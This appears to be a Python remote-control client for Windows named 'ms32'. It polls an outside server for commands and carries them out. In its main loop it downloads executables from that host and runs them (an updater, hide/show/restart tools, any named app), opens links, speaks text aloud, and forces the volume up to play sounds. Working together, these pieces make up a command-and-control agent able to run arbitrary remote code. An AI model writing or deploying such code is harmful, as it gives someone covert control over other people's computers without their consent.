import requests as rq
from time import sleep
from threading import Thread
from webbrowser import open as wbopen
import pygame
import os
import pyttsx3
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from comtypes import CLSCTX_ALL, CoInitialize, CoUninitialize
from win32 import win32gui

url = "https://ms32-sha2.onrender.com/"
terminate = False
HWND = 0
SW_HIDE = 0
SW_SHOW = 5

try:
    pygame.mixer.init()
except:
    pass
if not os.path.exists("effects"):
    os.mkdir("effects")
def hit(url:str):
    try:
        if not terminate:
            return rq.get(url,stream=True)
    except:
        return "none"

def say(txt):
    engine = pyttsx3.init()
    engine.setProperty("rate",engine.getProperty('rate')-40)
    engine.say(txt)
    engine.runAndWait()

def playfunc(fp):
    if not os.path.exists(os.path.join("effects",fp)):
        audi = hit(url+f"static/sounds/{fp}")
        with open(os.path.join("effects",fp), "xb") as file:
            downloaded_size = 0
            for chunk in audi.iter_content(chunk_size=8192):
                if chunk:
                    file.write(chunk)
                    downloaded_size += len(chunk)
    # try:                
    CoInitialize()
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = interface.QueryInterface(IAudioEndpointVolume)
    
    vmin, vmax, _ = volume.GetVolumeRange()
    target = vmin + (95 / 100.0) * (vmax - vmin)
    target = max(min(target, vmax), vmin)
    volume.SetMasterVolumeLevel(target, None)
    # except:
    #     pass
    CoUninitialize()
    pygame.mixer.music.load(f"effects/{fp}")
    pygame.mixer.music.play()
    while pygame.mixer.music.get_busy():
        continue               
    
def update():
    global terminate
    exe = hit(url+"static/updates/ms32-1.exe")
    total_size = int(exe.headers.get('content-length', 0))
    with open("ms32-1.exe", "xb") as file:
        downloaded_size = 0
        for chunk in exe.iter_content(chunk_size=8192):
            if chunk:
                file.write(chunk)
                downloaded_size += len(chunk)
    exe = hit(url+"static/updates/updater.exe")
    with open("updater.exe", "wb") as file:
        downloaded_size = 0
        for chunk in exe.iter_content(chunk_size=8192):
            if chunk:
                file.write(chunk)
                downloaded_size += len(chunk)
    os.startfile("updater.exe")
    terminate=True
    return

def hide(state):
    if state:
        if not os.path.exists("hide.exe"):
            exe = hit(url+"static/updates/hide.exe")
            with open("hide.exe", "xb") as file:
                downloaded_size = 0
                for chunk in exe.iter_content(chunk_size=8192):
                    if chunk:
                        file.write(chunk)
                        downloaded_size += len(chunk)
        os.startfile("hide.exe")
    else:
        if not os.path.exists("show.exe"):
            exe = hit(url+"static/updates/show.exe")
            with open("show.exe", "xb") as file:
                downloaded_size = 0
                for chunk in exe.iter_content(chunk_size=8192):
                    if chunk:
                        file.write(chunk)
                        downloaded_size += len(chunk)
        os.startfile("show.exe")

def restart():
    global terminate
    if not os.path.exists("restart.exe"):
        exe = hit(url+"static/updates/restart.exe")
        with open("restart.exe", "xb") as file:
            downloaded_size = 0
            for chunk in exe.iter_content(chunk_size=8192):
                if chunk:
                    file.write(chunk)
                    downloaded_size += len(chunk)
    os.startfile("restart.exe")
    terminate = True

def run(name):
    exe = hit(url+f"static/updates/apps/{name}.exe")
    with open(f"{name}.exe", "xb") as file:
        downloaded_size = 0
        for chunk in exe.iter_content(chunk_size=8192):
            if chunk:
                file.write(chunk)
                downloaded_size += len(chunk)
    os.startfile(f"{name}.exe")

def main():
    while not terminate:
        sleep(0.8)
        cmd = hit(url+"command")
        if type(cmd) != str:
            cmd = cmd.content.decode("utf-8")
        print(cmd)
        if "hIdE on" in cmd:
            hide(True)
        elif "hIdE off" in cmd:
            hide(False)
        elif "rEsTaRt" in cmd:
            restart()
        elif "sPeAk" in cmd:
            txt = cmd.replace("sPeAk","")
            saying = Thread(target=say,args=(txt,))
            saying.start()
        elif "oPeN" in cmd:
            link = cmd.replace("oPeN ","")
            wbopen(link)
        elif "pLaY" in cmd:
            fp = cmd.replace("pLaY ","")
            Thread(target=playfunc,args=(fp,)).start()
        elif "uPdAtE" in cmd:
            update()
        elif "rUn" in cmd:
            app_name = cmd.replace("rUn ","")
            run(app_name)

main()
